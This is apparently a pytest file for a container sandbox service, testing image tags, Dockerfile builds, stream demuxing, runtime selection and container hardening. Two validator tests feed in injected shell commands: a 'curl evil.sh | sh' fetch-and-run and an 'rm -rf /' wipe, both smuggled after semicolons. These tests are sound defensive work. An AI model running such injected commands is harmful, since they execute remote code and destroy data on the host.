"""Shared container machinery: image tags, dockerfile generation, build."""
import pytest

from app.services.container_runtime import (
    IMAGE_SCHEMA_VERSION,
    _validate_packages,
    _validate_python_version,
    ensure_docker_image,
    image_tag_for,
)
from tests.sandbox_fakes import FakeDockerClient


def test_image_tag_includes_schema_version():
    payload = {"id": "env1", "packages_hash": "abc123"}
    tag = image_tag_for(payload)
    assert tag == f"nodyra-env:env1-abc123-{IMAGE_SCHEMA_VERSION}"


def test_image_tag_defaults():
    assert image_tag_for({}) == f"nodyra-env:default-latest-{IMAGE_SCHEMA_VERSION}"


def test_build_skipped_when_cached():
    client = FakeDockerClient()
    client.images.existing.add("sometag")
    ensure_docker_image(client, "sometag", {"python_version": "3.12", "packages": []})
    assert client.images.built == []


def test_attach_raw_socket_unwraps_both_shapes():
    """attach_socket() returns SocketIO (with ._sock) on Unix daemons but a
    bare NpipeSocket on Windows named pipes — both must work."""
    from app.services.container_runtime import attach_raw_socket

    class Raw:
        pass

    class SocketIOLike:
        def __init__(self):
            self._sock = Raw()

    wrapped = SocketIOLike()
    assert attach_raw_socket(wrapped) is wrapped._sock
    bare = Raw()
    assert attach_raw_socket(bare) is bare


def test_stream_demuxer_strips_frame_headers():
    """No-TTY attach streams are multiplexed: 8-byte header (stream type +
    big-endian length) per frame. json.loads must never see a header."""
    from app.services.container_runtime import DockerStreamDemuxer

    def frame(stream_type: int, payload: bytes) -> bytes:
        return bytes([stream_type, 0, 0, 0]) + len(payload).to_bytes(4, "big") + payload

    d = DockerStreamDemuxer()
    assert d.feed(frame(1, b'{"type":"ready"}\n')) == b'{"type":"ready"}\n'
    # two frames in one chunk
    two = frame(1, b"abc") + frame(1, b"def\n")
    assert d.feed(two) == b"abcdef\n"


def test_stream_demuxer_partial_frames_across_recvs():
    from app.services.container_runtime import DockerStreamDemuxer

    payload = b'{"type":"result","status":"success"}\n'
    framed = bytes([1, 0, 0, 0]) + len(payload).to_bytes(4, "big") + payload
    d = DockerStreamDemuxer()
    out = b""
    # deliver one byte at a time — header and payload split arbitrarily
    for i in range(len(framed)):
        out += d.feed(framed[i:i + 1])
    assert out == payload


def test_base_image_built_from_workspace_source():
    """The nodyra packages are not on PyPI — the base image must install them
    from the workspace source shipped in the build context."""
    import io
    import tarfile

    from app.services.container_runtime import base_image_tag, ensure_base_image

    client = FakeDockerClient()
    tag = ensure_base_image(client, "3.12")
    assert tag == base_image_tag("3.12")
    assert tag.endswith(f"-{IMAGE_SCHEMA_VERSION}")
    assert client.images.built == [tag]

    call = client.images.build_calls[0]
    assert call["custom_context"] is True
    with tarfile.open(fileobj=io.BytesIO(call["fileobj"].getvalue())) as tar:
        names = tar.getnames()
        df = tar.extractfile("Dockerfile").read().decode()
    for pkg in ("core", "nodes", "runtime"):
        assert f"packages/{pkg}/pyproject.toml" in names
    assert not any("__pycache__" in n or "/tests/" in n for n in names)
    # installs from the copied source, never from PyPI names
    assert "/opt/nodyra-src/packages/runtime" in df
    assert "uv pip install --system nodyra-runtime" not in df
    assert "useradd" in df and "USER nodyra" in df
    assert df.index("uv pip install") < df.index("USER nodyra")


def test_base_image_cached():
    from app.services.container_runtime import base_image_tag, ensure_base_image

    client = FakeDockerClient()
    client.images.existing.add(base_image_tag("3.12"))
    ensure_base_image(client, "3.12")
    assert client.images.built == []


def test_env_image_derives_from_base():
    """Env images are thin layers over the base: FROM base, extra packages
    installed as root, then privileges dropped again."""
    from app.services.container_runtime import base_image_tag

    captured = {}
    client = FakeDockerClient()
    orig = client.images.build

    def capture(fileobj=None, tag="", rm=True, **kw):
        if not kw.get("custom_context"):
            captured["dockerfile"] = fileobj.read().decode()
        return orig(fileobj=fileobj, tag=tag, rm=rm, **kw)

    client.images.build = capture
    ensure_docker_image(
        client, "t1", {"python_version": "3.12", "packages": ["requests==2.31.0"]}
    )
    base = base_image_tag("3.12")
    assert client.images.built[0] == base  # base built first
    assert client.images.built[1] == "t1"
    df = captured["dockerfile"]
    assert df.startswith(f"FROM {base}\n")
    assert "requests==2.31.0" in df
    # install happens as root, then drops back to the base image's user
    assert df.index("USER root") < df.index("uv pip install")
    assert df.index("uv pip install") < df.index("USER nodyra")


def test_env_image_without_extra_packages_is_from_only():
    from app.services.container_runtime import base_image_tag

    captured = {}
    client = FakeDockerClient()
    client.images.existing.add(base_image_tag("3.12"))
    orig = client.images.build

    def capture(fileobj=None, tag="", rm=True, **kw):
        captured["dockerfile"] = fileobj.read().decode()
        return orig(fileobj=fileobj, tag=tag, rm=rm, **kw)

    client.images.build = capture
    ensure_docker_image(client, "t2", {"python_version": "3.12", "packages": []})
    assert captured["dockerfile"] == f"FROM {base_image_tag('3.12')}\n"


def test_package_validation_blocks_shell_metacharacters():
    with pytest.raises(ValueError):
        _validate_packages(["requests; curl evil.sh | sh"])
    assert _validate_packages(["numpy>=1.26,<2", " ", "pandas[excel]==2.2.0"]) == [
        "numpy>=1.26,<2",
        "pandas[excel]==2.2.0",
    ]


def test_python_version_validation():
    assert _validate_python_version("3.12") == "3.12"
    with pytest.raises(ValueError):
        _validate_python_version("3.12; rm -rf /")


# --- isolation runtime probe -------------------------------------------------

from app.services.container_runtime import detect_runtime  # noqa: E402


def test_probe_auto_prefers_strongest():
    assert detect_runtime(FakeDockerClient(runtimes=("runc",)), "auto") == "runc"
    assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc")), "auto") == "runsc"
    assert (
        detect_runtime(FakeDockerClient(runtimes=("runc", "runsc", "kata")), "auto")
        == "kata"
    )


def test_probe_explicit_runtime_must_exist():
    assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc")), "runsc") == "runsc"
    with pytest.raises(RuntimeError, match="runsc"):
        detect_runtime(FakeDockerClient(runtimes=("runc",)), "runsc")


def test_probe_runc_always_available():
    """Docker Desktop daemons sometimes omit Runtimes from info()."""

    class NoRuntimesClient(FakeDockerClient):
        def info(self):
            return {}

    assert detect_runtime(NoRuntimesClient(), "auto") == "runc"
    assert detect_runtime(NoRuntimesClient(), "runc") == "runc"


def test_probe_invalid_value():
    with pytest.raises(ValueError, match="sandbox_runtime"):
        detect_runtime(FakeDockerClient(), "qemu")


# --- hardened spawn kwargs + sandbox network ---------------------------------

from app.services.container_runtime import (  # noqa: E402
    ensure_sandbox_network,
    hardening_kwargs,
)


def test_hardening_kwargs_complete():
    kw = hardening_kwargs(runtime="runsc", network="nodyra-sandbox")
    assert kw["cap_drop"] == ["ALL"]
    assert kw["security_opt"] == ["no-new-privileges:true"]
    assert kw["read_only"] is True
    assert kw["tmpfs"] == {"/tmp": "size=256m"}
    assert kw["mem_limit"] == "1g"
    assert kw["nano_cpus"] == 1_000_000_000
    assert kw["pids_limit"] == 256
    assert kw["network"] == "nodyra-sandbox"
    assert kw["runtime"] == "runsc"
    assert kw["labels"] == {
        "io.nodyra.managed": "true",
        "io.nodyra.kind": "sandbox-run",
    }
    # rootfs is read-only, so HOME must point at the writable tmpfs
    assert kw["environment"] == {"HOME": "/tmp"}


def test_hardening_kwargs_overrides():
    kw = hardening_kwargs(
        runtime="runc", network="bridge",
        overrides={"mem_limit": "4g", "pids_limit": 1024, "nano_cpus": 2_000_000_000},
    )
    assert kw["mem_limit"] == "4g"
    assert kw["pids_limit"] == 1024
    assert kw["nano_cpus"] == 2_000_000_000
    # overrides can't strip the security floor
    assert kw["cap_drop"] == ["ALL"]
    assert kw["read_only"] is True


def test_ensure_sandbox_network_creates_once():
    client = FakeDockerClient()
    assert ensure_sandbox_network(client, "nodyra-sandbox") == "nodyra-sandbox"
    assert "nodyra-sandbox" in client.networks.existing
    ensure_sandbox_network(client, "nodyra-sandbox")  # idempotent, no error


def test_ensure_sandbox_network_creation_race():
    """Two workers racing to create: create conflicts, but re-get succeeds."""
    client = FakeDockerClient()

    def create_then_appear(name, **kw):
        client.networks.existing.add(name)
        raise RuntimeError("409 conflict")

    client.networks.create = create_then_appear
    assert ensure_sandbox_network(client, "nodyra-sandbox") == "nodyra-sandbox"


def test_ensure_sandbox_network_hard_failure():
    client = FakeDockerClient()

    def always_fail(name, **kw):
        raise RuntimeError("daemon on fire")

    client.networks.create = always_fail
    with pytest.raises(RuntimeError, match="sandbox network"):
        ensure_sandbox_network(client, "nodyra-sandbox")


# --- docker runner-pool provider hardening -----------------------------------

import asyncio  # noqa: E402


def test_docker_provider_spawns_hardened(monkeypatch):
    """assign_docker_run passes the security floor to containers.run and
    sends the run message exactly once (after ready)."""
    from app.services.providers import docker as provider

    client = FakeDockerClient()

    class FakeSession:
        async def get(self, model, pid):
            class P:
                provider_config = {"runtime": "runsc", "limits": {"mem_limit": "2g"}}

            return P()

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

    import docker as docker_sdk  # noqa: PLC0415

    monkeypatch.setattr(docker_sdk, "from_env", lambda: client)

    events: list[dict] = []

    async def on_event(e):
        events.append(e)

    async def scenario():
        task = asyncio.create_task(
            provider.assign_docker_run(
                lambda: FakeSession(), "run123", "pool1",
                {"id": "env1", "packages_hash": "h", "python_version": "3.12",
                 "packages": []},
                {"nodes": [], "edges": []}, None, None, [], on_event,
            )
        )
        for _ in range(50):
            if client.containers_made:
                break
            await asyncio.sleep(0.1)
        assert client.containers_made
        sock = client.containers_made[0].sock._sock
        sock.feed({"type": "result", "status": "success"})
        return await task

    status = asyncio.run(scenario())
    assert status == "success"
    call = client.run_calls[0]
    assert call["cap_drop"] == ["ALL"]
    assert call["runtime"] == "runsc"
    assert call["mem_limit"] == "2g"          # pool override applied
    assert call["read_only"] is True
    run_msgs = [m for m in client.containers_made[0].sock._sock.sent_messages()
                if m.get("type") == "run"]
    assert len(run_msgs) == 1                  # double-send fixed
    assert client.containers_made[0].removed   # torn down in finally
